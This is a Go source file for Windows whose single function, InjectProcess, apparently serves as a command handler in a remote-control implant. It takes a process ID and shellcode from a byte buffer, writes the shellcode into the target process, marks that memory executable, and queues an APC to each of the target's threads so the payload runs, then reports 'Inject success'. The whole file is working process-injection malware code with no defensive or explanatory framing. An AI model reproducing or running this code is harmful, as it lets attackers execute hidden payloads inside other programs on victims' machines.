//go:build windows
package packet

import (
	"errors"
	"fmt"
	"golang.org/x/sys/windows"
	"unsafe"
)

func InjectProcess(b []byte) ([]byte, error){
	pid := ReadInt(b)
	shellcode := b[8:]

	hProcess, err := windows.OpenProcess(windows.STANDARD_RIGHTS_REQUIRED|windows.SYNCHRONIZE|0xFFFF, false, pid)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	addr, _, _ := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if addr == 0 {
		fmt.Println("VirtualAlloc Failed")
		return nil, errors.New("VirtualAlloc Failed")
	} else {
		fmt.Println("Alloc: Success")
	}
	_, _, errWriteMemory := WriteProcessMemory.Call(uintptr(hProcess), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errWriteMemory.Error() != "The operation completed successfully." {
		fmt.Println("WriteMemory: Failed")
		return nil, errWriteMemory
	} else {
		fmt.Println("WriteMemory: Success")
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtectEx.Call(uintptr(hProcess), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect.Error() != "The operation completed successfully." {
		fmt.Println("VirtualProtect: Failed")
		return nil, errVirtualProtect
	} else {
		fmt.Println("VirtualProtect: Success")
	}

	//targetThreadId := windows.GetCurrentThreadId()
	hThread, _ := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, pid)
	if hThread != windows.InvalidHandle {
		var threadEntry windows.ThreadEntry32
		threadEntry.Size = uint32(unsafe.Sizeof(threadEntry))
		err := windows.Thread32First(hThread, &threadEntry)
		for err == nil {
			//if threadEntry.Size >= threadEntry.OwnerProcessID+uint32(unsafe.Sizeof(threadEntry.OwnerProcessID)) {
			//fmt.Println(threadEntry)
			if threadEntry.OwnerProcessID == pid {
				//fmt.Println(threadEntry.ThreadID)
				pThread, err := windows.OpenThread(windows.STANDARD_RIGHTS_REQUIRED|windows.SYNCHRONIZE|0xFFFF, false, threadEntry.ThreadID)
				if err != nil && err.Error() != "The operation completed successfully."{
					fmt.Println(err)
					return nil, err
				}
				if pThread != 0 {
					_, _, errQueueUserAPC := QueueUserAPC.Call(addr, uintptr(pThread), 0)
					if errQueueUserAPC.Error() != "The operation completed successfully." {
						fmt.Println("QueueUserAPC: Failed")
						return nil, errQueueUserAPC
					} else {
						fmt.Println("QueueUserAPC: Success")
					}
					_, _, errResumeThread := ResumeThread.Call(uintptr(pThread))
					if errResumeThread != nil {
						fmt.Println(errResumeThread)
					}
					err = windows.CloseHandle(pThread)
					if err != nil {
						fmt.Println(err)
						return nil, err
					}
				}
			}
			//}
			threadEntry.Size = uint32(unsafe.Sizeof(threadEntry))
			err = windows.Thread32Next(hThread, &threadEntry)
		}
	}
	return []byte("Inject success"), nil
}
